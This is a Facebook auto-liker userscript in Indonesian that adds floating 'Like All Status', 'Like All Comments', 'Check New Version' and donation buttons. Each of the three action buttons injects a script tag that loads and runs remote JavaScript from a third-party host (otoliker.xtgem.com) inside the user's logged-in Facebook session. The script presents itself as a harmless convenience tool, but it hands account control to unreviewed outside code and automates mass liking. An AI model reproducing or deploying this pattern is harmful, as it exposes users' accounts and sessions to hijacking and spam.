// ==UserScript==
// @name               Auto Like Facebook By RyoyTK – Cyber Kazuya
// @namespace          auto_like_facebook
// @description        Like Semua Status Facebook Teman Anda Hanya Dengan 1x Klik Maka Ribuan Jempol Akan Melayang Automatis.
// @author             Ryory Tenryu Kazuya
// @authorURL          http://www.facebook.com/ryory.tk
// @homepage           http://www.kazuya.us/
// @homepage           http://www.kazuya.us/
// @include            htt*://www.facebook.com/*
// @version            12.1.0
// @exclude            htt*://*static*.facebook.com*
// @exclude            htt*://*channel*.facebook.com*
// @exclude            htt*://developers.facebook.com/*
// @exclude            htt*://upload.facebook.com/*
// @exclude            htt*://www.facebook.com/common/blank.html
// @exclude            htt*://*connect.facebook.com/*
// @exclude            htt*://*facebook.com/connect*
// @exclude            htt*://www.facebook.com/plugins/*
// @exclude            htt*://www.facebook.com/l.php*
// @exclude            htt*://www.facebook.com/ai.php*
// @exclude            htt*://www.facebook.com/extern/*
// @exclude            htt*://www.facebook.com/pagelet/*
// @exclude            htt*://api.facebook.com/static/*
// @exclude            htt*://www.facebook.com/contact_importer/*
// @exclude            htt*://www.facebook.com/ajax/*
// @exclude            htt*://apps.facebook.com/ajax/*
// @exclude            htt*://www.facebook.com/advertising/*
// @exclude            htt*://www.facebook.com/ads/*
// @exclude            htt*://www.facebook.com/sharer/*
// @exclude            htt*://www.facebook.com/send/*
// @exclude            htt*://www.facebook.com/mobile/*
// @exclude            htt*://www.facebook.com/settings/*
// @exclude            htt*://www.facebook.com/dialog/*
// @exclude            htt*://www.facebook.com/plugins/*

// ==/UserScript==

// ==============
body = document.body;
if(body != null) {div = document.createElement("div");div.setAttribute('id','like2');div.style.position = "fixed";div.style.display = "block";div.style.width = "130px"; div.style.opacity= 0.90;div.style.bottom = "+140px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #5C00F9";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AutoLike()'><center>Like All Status</center></a></a>"
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="//otoliker.xtgem.com/1210",b.body.appendChild(a);void(0);};}
body = document.body;
if(body != null) {div = document.createElement("div");div.setAttribute('id','like3');div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+119px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #5C00F9";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='LikeComments()'><center>Like All Comments</center></a>"
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="//otoliker.xtgem.com/1210lac",b.body.appendChild(a);void(0);};}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+95px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #5C00F9";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' href='' title='Refresh'><center>Reload (F5)</center></a>"
body.appendChild(div);}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+74px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #5C00F9";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' href='http://www.facebook.com/ryorytk' title='Ryory Tenryu Kazuya'><center>@ryory_chingu</center></a>"
body.appendChild(div);}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+50px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #5C00F9";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='http://www.kazuya.us/2012/05/donasi.html' title='Donasi | Cyber Kazuya'><blink><center>Donasi..!!!</center></blink></a>"
body.appendChild(div);}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+29px";div.style.left = "+8px";div.style.backgroundColor = "#E7EBF2";div.style.border = "1px solid #5C00F9";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='UpdateVersion()'><center>Check New Version</center></a></a>"
body.appendChild(div);unsafeWindow.UpdateVersion = function() {javascript:(a=(b=document).createElement("script")).src="//otoliker.xtgem.com/notice",b.body.appendChild(a);void(0);};}